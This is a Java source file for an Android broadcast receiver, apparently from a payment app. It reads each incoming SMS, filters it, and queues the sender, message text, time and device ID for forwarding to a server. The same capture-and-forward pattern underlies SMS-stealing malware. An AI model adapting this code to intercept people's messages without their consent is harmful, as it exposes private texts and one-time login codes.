package com.paykr.observer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public final class SmsReceiver extends BroadcastReceiver {
    private static final ExecutorService DISK=Executors.newSingleThreadExecutor();
    public void onReceive(Context context,Intent intent) {
        if(intent==null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction()) || !CaptureSettings.enabled(context))return;
        SmsMessage[] parts=Telephony.Sms.Intents.getMessagesFromIntent(intent);if(parts==null)return;
        Map<String,StringBuilder> messages=new LinkedHashMap<>();Map<String,Long> times=new LinkedHashMap<>();
        for(SmsMessage part:parts) {
            if(part==null || part.getOriginatingAddress()==null)continue;
            String sender=part.getOriginatingAddress();
            if(!messages.containsKey(sender)){messages.put(sender,new StringBuilder());times.put(sender,part.getTimestampMillis());}
            if(part.getMessageBody()!=null)messages.get(sender).append(part.getMessageBody());
        }
        String device=new ApiClient(context).getDeviceId();
        PendingResult pending=goAsync();Context app=context.getApplicationContext();
        DISK.execute(()->{try {
            for(Map.Entry<String,StringBuilder> entry:messages.entrySet()) {
                String text=entry.getValue().toString();
                if(Protocol.captureSms(entry.getKey(),text))Outbox.enqueue(app,entry.getKey(),text,times.get(entry.getKey()),null,device);
            }
            ObserverService.start(app);
        }finally{pending.finish();}});
    }
}
